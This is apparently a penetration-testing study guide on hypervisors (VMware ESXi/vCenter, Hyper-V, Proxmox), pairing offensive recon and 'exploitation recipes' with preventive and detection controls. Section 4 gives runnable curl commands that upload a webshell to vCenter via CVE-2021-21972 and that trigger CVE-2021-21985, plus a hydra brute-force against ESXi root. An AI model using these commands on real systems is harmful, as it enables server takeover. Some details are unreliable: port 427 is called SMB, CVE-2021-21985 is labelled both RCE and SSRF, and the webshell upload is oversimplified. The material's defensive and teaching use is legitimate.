# Hypervisor Fundamentals

## 1. Overview

A hypervisor is software that creates and runs virtual machines (VMs). It abstracts physical hardware and presents it to guest operating systems as virtual hardware. Hypervisors are the foundation of modern data centers, cloud infrastructure, and VDI (Virtual Desktop Infrastructure).

There are two types:

- **Type 1 (bare-metal):** runs directly on hardware. Examples: VMware ESXi, Microsoft Hyper-V, Xen, KVM (when used as a kernel module), Proxmox VE (KVM + LXC).
- **Type 2 (hosted):** runs as an application on top of a host OS. Examples: VMware Workstation, Oracle VirtualBox, Parallels Desktop.

Security testing of hypervisors focuses on the management plane (vCenter, SCVMM, Proxmox web UI), the hypervisor kernel itself, and the virtual network (vSwitch, virtual firewall).

## 2. Reconnaissance / Enumeration

### Offensive

- **Port scanning:** ESXi exposes 443 (vSphere Client), 902 (VMware ESXi SOAP), 80 (redirect), 427 (SMB), 5988/5989 (CIM). Hyper-V exposes 5985/5986 (WinRM), 135, 445.
- **Banner grabbing:** `curl -k https://<target>/` often reveals the ESXi version and build number.
- **SSL certificate:** the default ESXi certificate contains the hostname and version.
- **vSphere API:** `curl -k https://<target>/sdk` returns the API version.
- **Proxmox:** port 8006 (web UI), 3128 (SPICE proxy), 22 (SSH).

### Defensive

- Restrict management interfaces to a dedicated management VLAN.
- Disable unused services (CIM, SMB, SSH) on ESXi hosts.
- Use certificate-based authentication for vCenter and ESXi.
- Monitor for scans against ports 443, 902, 8006 on hypervisor subnets.

## 3. Common Attack Vectors

- **Default credentials:** ESXi root with no password, vCenter with `administrator@vsphere.local` and weak passwords.
- **Unpatched vulnerabilities:** CVE-2021-21972 (vCenter RCE), CVE-2021-21985 (vCenter RCE), CVE-2023-34048 (vCenter DCERPC RCE).
- **Management plane exposure:** vCenter or ESXi web UI reachable from the internet.
- **Snapshot abuse:** restoring a snapshot to bypass security controls or access old data.
- **Virtual network sniffing:** promiscuous mode on a vSwitch allows a VM to capture traffic from other VMs on the same port group.

## 4. Exploitation Recipes

### CVE-2021-21972 (vCenter Server RCE)

```bash
# Check if vCenter is vulnerable
curl -k https://<target>/ui/vropspluginui/rest/services/getstatus

# Upload a webshell via the vROPS plugin
curl -k -X POST https://<target>/ui/vropspluginui/rest/services/uploadova \
  -F "uploadFile=@shell.jsp"
```

### ESXi default credentials

```bash
# Try root with no password
ssh root@<target>

# Try common passwords with hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target>
```

### vCenter SSRF (CVE-2021-21985)

```bash
curl -k "https://<target>/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/setTargetObject" \
  -H "Content-Type: application/json" \
  -d '{"methodInput":[{"type":"ClusterComputeResource","value":null,"serverGuid":null}]}'
```

## 5. Post-Exploitation

- **Access to VM datastores:** ESXi datastores contain VMDK files. Mounting a VMDK on a compromised ESXi host gives access to the guest filesystem.
- **Snapshot extraction:** `vim-cmd vmsvc/snapshot.get <vmid>` lists snapshots; a snapshot file can be downloaded and mounted.
- **vCenter SSO database:** contains hashed credentials for all vCenter users.
- **Virtual network pivoting:** from a compromised VM, use promiscuous mode to sniff traffic on the virtual switch.

## 6. Preventive Controls (Defensive)

- **Patch management:** apply VMware security advisories promptly. CVE-2021-21972 and CVE-2021-21985 were exploited in the wild within days of disclosure.
- **Network segmentation:** management interfaces (vCenter, ESXi, Proxmox) must be on a dedicated management VLAN, never exposed to the internet.
- **MFA:** enable multi-factor authentication for vCenter SSO and ESXi SSH.
- **Least privilege:** do not use the `root` account for daily operations. Create named accounts with the minimum required role.
- **Disable unused services:** CIM, SMB, SSH, and the ESXi Shell must be disabled unless actively used.
- **Certificate management:** replace default self-signed certificates with certificates from a trusted internal CA.

## 7. Detection Controls (Defensive)

- **vCenter audit logs:** monitor for `com.vmware.vapi` events, especially `UploadOva`, `SetTargetObject`, and `Login`.
- **ESXi shell logs:** `/var/log/shell.log` and `/var/log/hostd.log` capture SSH and API activity.
- **Network IDS:** alert on scans against ports 443, 902, 8006 on hypervisor subnets.
- **SIEM correlation:** a successful login from a new IP to vCenter followed by a VM snapshot creation is a high-fidelity alert.

## 8. Verification

- Run `nmap -p 443,902,8006 <target>` to confirm management ports are closed from untrusted networks.
- Check ESXi `esxcli network firewall ruleset list` to confirm only required services are allowed.
- Verify vCenter SSO MFA is enforced: `vSphere Client -> Administration -> Single Sign On -> Configuration`.
- Review `/var/log/vmware/vpxd/vpxd.log` on vCenter for failed login attempts.

## 9. OSCP Notes

- OSCP exam scope does not include hypervisor exploitation directly. However, a compromised hypervisor can be a pivot point to multiple VMs.
- Screenshot the ESXi version and the successful login for the report.
- Document the exact CVE and the patch level of the target.

## 10. Production Notes

- **Change management:** hypervisor patches require a maintenance window. Test in a lab first.
- **Backup:** vCenter configuration backups (`vdcbackup`) must be encrypted and stored offline.
- **Monitoring:** integrate vCenter events into the SIEM. Alert on `UploadOva` and `SetTargetObject` events.
- **Incident response:** if a hypervisor is compromised, assume all VMs on that host are compromised. Isolate the host, snapshot the VMs for forensics, and rebuild.

## 11. References

- VMware Security Advisories - https://www.vmware.com/security/advisories
- CVE-2021-21972 NVD - https://nvd.nist.gov/vuln/detail/CVE-2021-21972
- CVE-2021-21985 NVD - https://nvd.nist.gov/vuln/detail/CVE-2021-21985
- CVE-2023-34048 NVD - https://nvd.nist.gov/vuln/detail/CVE-2023-34048
- NIST SP 800-125 - https://csrc.nist.gov/publications/detail/sp/800-125/final
